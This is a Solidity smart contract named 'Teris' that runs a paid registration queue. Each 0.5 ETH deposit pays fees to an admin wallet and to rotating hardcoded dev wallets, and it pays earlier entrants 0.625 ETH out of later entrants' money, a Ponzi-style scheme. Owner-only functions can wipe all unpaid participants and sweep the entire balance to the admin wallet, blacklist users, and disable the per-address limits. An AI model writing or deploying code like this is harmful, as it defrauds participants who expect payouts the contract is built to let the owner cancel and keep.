 

pragma solidity 0.4.24;
contract Owned 
{
    address public owner;
    address public ownerCandidate;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }
    
    function changeOwner(address _newOwner) public onlyOwner {
        ownerCandidate = _newOwner;
    }
    
    function acceptOwnership() public {
        require(msg.sender == ownerCandidate);  
        owner = ownerCandidate;
    }
}

contract Priced
{
    modifier costs(uint price)
    {
         
        require(msg.value == price);
        _;
    }
}
 
 
 

contract Teris is Owned, Priced
{
    string public debugString;
    
     
    address adminWallet = 0x45FEbD925Aa0439eE6bF2ffF5996201e199Efb5b;

     
    uint8 public devWalletRotation = 0;
    
     
    mapping(address => uint8) transactionLimits;
    
     
     
    uint256 maxTransactions = 640;
    uint16 totalTransactions;
    modifier notLocked()
    {
        require(!isLocked());
        _;
    }
    
     
    struct Participant
    {
        address ethAddress;
        bool paid;
    }
    
    Participant[] allParticipants;
    uint16 lastPaidParticipant;
    
     
     mapping(address => bool) blacklist;

    bool testing = false;
    
        

     
    function register() public payable costs(500 finney) notLocked
    {
         
        transactionLimits[msg.sender]++;    
        
        if(!testing)
        {
            require(_checkTransactions(msg.sender));
        }
        
        require(!blacklist[msg.sender]);
            
        
         
        _payFees();
        
         
        allParticipants.push(Participant(msg.sender, false));
        
         
        totalTransactions++;
        
         
        _payout();
        
    }
    
     
    
    function _checkTransactions(address _toCheck) private view returns(bool)
    {
         
        
         
        if(transactionLimits[_toCheck] > 4)
            return false;
        else
            return true;
        
        
    }
    
     
    function _payFees() private
    {
        adminWallet.transfer(162500000000000000);  
   

        address walletAddress ;
        devWalletRotation++;
        
        
        if(devWalletRotation >= 7)
            devWalletRotation = 1;
        
        if(devWalletRotation == 1)
            walletAddress = 0x556FD37b59D20C62A778F0610Fb1e905b112b7DE;
        else if(devWalletRotation == 2)
            walletAddress = 0x92f94ecdb1ba201cd0e4a0a9a9bccb1faa3a3de0;
        else if(devWalletRotation == 3)
            walletAddress = 0x41271507434E21dBd5F09624181d7Cd70Bf06Cbf;
        else if (devWalletRotation == 4)
            walletAddress = 0xbeb07c2d5beca948eb7d7eaf60a30e900f470f8d;
        else if (devWalletRotation == 5)
            walletAddress = 0xcd7c53462067f0d0b8809be9e3fb143679a270bb;
        else if (devWalletRotation == 6)
            walletAddress = 0x9184B1D0106c1b7663D4C3bBDBF019055BB813aC;
        else
            walletAddress = adminWallet;
            
            
            
        
        walletAddress.transfer(25000000000000000);
        

    }

     
    function _payout() private
    {

        for(uint16 i = lastPaidParticipant; i < allParticipants.length; i++)
        {
            if(allParticipants[i].paid)
            {
                lastPaidParticipant = i;
                continue;
            }
            else
            {
                if(address(this).balance < 625000000000000000)
                    break;
                
                allParticipants[i].ethAddress.transfer(625000000000000000);
                allParticipants[i].paid = true;
                transactionLimits[allParticipants[i].ethAddress]--;  
                lastPaidParticipant = i;
            }
        }
        
         
        if(lastPaidParticipant >= maxTransactions)
            _unlockContract();
    }
    
    function _unlockContract() internal
    {
         
        for(uint256 i = 0; i < allParticipants.length; i++)
        {
            transactionLimits[allParticipants[i].ethAddress] = 0;
        }
        
         
        delete allParticipants;

        lastPaidParticipant = 0;
        
         
        adminWallet.transfer(address(this).balance);
        totalTransactions = 0;
    }

     
    function changeMaxTransactions(uint256 _amount) public onlyOwner
    {
        maxTransactions = _amount;
    }
    
    function unlockContract() public onlyOwner
    {
          
        for(uint256 i = 0; i < allParticipants.length; i++)
        {
            transactionLimits[allParticipants[i].ethAddress] = 0;
        }
        
         
        delete allParticipants;

        lastPaidParticipant = 0;
        
         
        adminWallet.transfer(address(this).balance);
        totalTransactions = 0;       
    }

     
     
    function addBalance() payable public onlyOwner
    {
        _payout();
    }
    
    function forcePayout() public onlyOwner
    {
        _payout();
    }
    
    function isTesting() public view onlyOwner returns(bool) 
    {
        return(testing);
    }
    
    function changeAdminWallet(address _newWallet) public onlyOwner
    {
        adminWallet = _newWallet;
    }
    
    function setTesting(bool _testing) public onlyOwner
    {
        testing = _testing;
    }
    
    function addToBlackList(address _addressToAdd) public onlyOwner
    {
        blacklist[_addressToAdd] = true;
    }
    
    function removeFromBlackList(address _addressToRemove) public onlyOwner
    {
        blacklist[_addressToRemove] = false;
    }

     
    function checkMyTransactions() public view returns(uint256)
    {
        return transactionLimits[msg.sender];
    }
    
    function getPeopleBeforeMe(address _address) public view returns(uint256)
    {
        uint counter = 0;
        
        for(uint16 i = lastPaidParticipant; i < allParticipants.length; i++)
        {
            if(allParticipants[i].ethAddress != _address)
            {
                counter++;
            }
            else
            {
                break;
            }
        }
        
        return counter;
    }
    
    function getMyOwed(address _address) public view returns(uint256)
    {
        uint counter = 0;
        
        for(uint16 i = 0; i < allParticipants.length; i++)
        {
            if(allParticipants[i].ethAddress == _address)
            {
                if(!allParticipants[i].paid)
                {
                    counter++;
                }
            }
        }
        
        return (counter * 625000000000000000);
    }
    
     
    function getBalance() public view returns(uint256)
    {
        return address(this).balance;
    }
    
     
    function isLocked() public view returns(bool)
    {
        if(totalTransactions >= maxTransactions)
            return true;
        else
            return false;
    }

     
    function getParticipantTransactions(address _address) public view returns(uint8)
    {
        return transactionLimits[_address];
    }
    
     
    function getTransactionInformation(uint _id) public view returns(address, bool)
    {
        return(allParticipants[_id].ethAddress, allParticipants[_id].paid);
    }

     
    function getLastPaidTransaction() public view returns(uint)
    {
        return (lastPaidParticipant);
    }
    
     
    function getNumberOfTransactions() public view returns(uint)
    {
        return (allParticipants.length);
    }
}